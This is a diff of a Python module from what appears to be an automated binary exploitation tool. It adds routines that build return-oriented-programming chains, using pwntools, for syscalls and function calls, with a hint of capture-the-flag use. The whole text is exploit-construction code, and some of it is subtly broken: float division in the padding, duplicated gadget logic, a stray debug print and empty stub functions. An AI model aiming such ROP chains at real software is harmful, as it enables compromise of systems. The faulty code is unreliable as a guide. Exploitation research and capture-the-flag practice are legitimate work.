@@ -2,15 +2,10 @@ import logging
 import r2pipe
 import binaryninja as bn
 
-import binaryninja as bn
-
-
 from pwn import *
 from binascii import *
 from rage.machine import Machine
 from rage.log import aegis_log
-
-
 
 class Against:
     """Class for dealing with exploiting the binary."""
@@ -39,6 +34,9 @@ class Against:
         self.libc_offset_string = b""
         self.canary_offset_string = b""
         self.format_write_string = b""
+        
+        self.padding = None
+        self.exploit = None
 
     def start(self, option):
         """Return the running process to a binary."""
@@ -63,11 +61,75 @@ class Against:
         aegis_log.info(f"Using write gadget {write_gadget}")
         write_gadget_address = int(write_gadget[0].split(b":")[0],16)
 
+        reg_params = self.machine.reg_args 
+
+
         return chain
+
+    def rop_chain_syscall(self, parameters):
+        """Return a rop chain to call a function with the specific parameters."""
+        chain = b""
+
+        reg_params = self.machine.sys_reg_args
+        print(reg_params)
+
+
+        if len(parameters) > 0:
+            for i in range(len(parameters)):
+                reg_gadgets = self.machine.find_reg_gadget(reg_params[i])
+                if reg_gadgets != None:
+                    for reg_gadget_str in reg_gadgets:
+                        reg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))
+                        chain += reg_gadget + p64(parameters[i])
+                        instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
+                        for inst in instructions:
+                            if b"pop" in inst:
+                                reg = inst.strip(b" ").split(b" ")[1]
+                                if reg.decode("utf-8") in reg_params:
+                                    index = reg_params.index(reg.decode("utf-8"))
+                                    chain += p64(parameters[index])
+                                else:
+                                    chain += p64(0)
+
+                            elif b"add rsp" in inst:
+                                value = int(inst.split(b",")[1].strip(), 16)
+                                chain += p64(0) * (value / 8)
+        
+            rop = ROP(self.elf)
+            chain += p64(rop.find_gadget(["syscall", "ret"])[0])
+
+        return chain
+
+
 
     def rop_chain_call_function(self, function, parameters):
         """Return a rop chain to call a function with the specific parameters."""
         chain = b""
+
+        reg_params = self.machine.reg_args
+
+        if len(parameters) > 0:
+            for i in range(len(parameters)):
+                reg_gadgets = self.machine.find_reg_gadget(reg_params[i])
+                if reg_gadgets != None:
+                    for reg_gadget_str in reg_gadgets:
+                        reg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))
+                        chain += reg_gadget + p64(parameters[i])
+                        instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
+                        for inst in instructions:
+                            if b"pop" in inst:
+                                reg = inst.strip(b" ").split(b" ")[1]
+                                if reg.decode("utf-8") in reg_params:
+                                    index = reg_params.index(reg.decode("utf-8"))
+                                    chain += p64(parameters[index])
+                                else:
+                                    chain += p64(0)
+
+                            elif b"add rsp" in inst:
+                                value = int(inst.split(b",")[1].strip(), 16)
+                                chain += p64(0) * (value / 8)
+        
+            chain += p64(self.elf.sym[function])
 
         return chain
 
@@ -87,7 +149,7 @@ class Against:
 
         aegis_log.info(f"Setting up libc leak with {leak_function}")
 
-        return chain
+        return chain 
 
     def rop_chain_libc(self, libc_base):
         """Return a ROP chain for ret2system in libc."""
@@ -118,7 +180,7 @@ class Against:
         chain = b""
         return chain
 
-    def rop_chain_open(self, flag_file):
+    def rop_chain_open(self, file):
         """Return a rop chain that opens a specific file."""
         chain = b""
         return chain
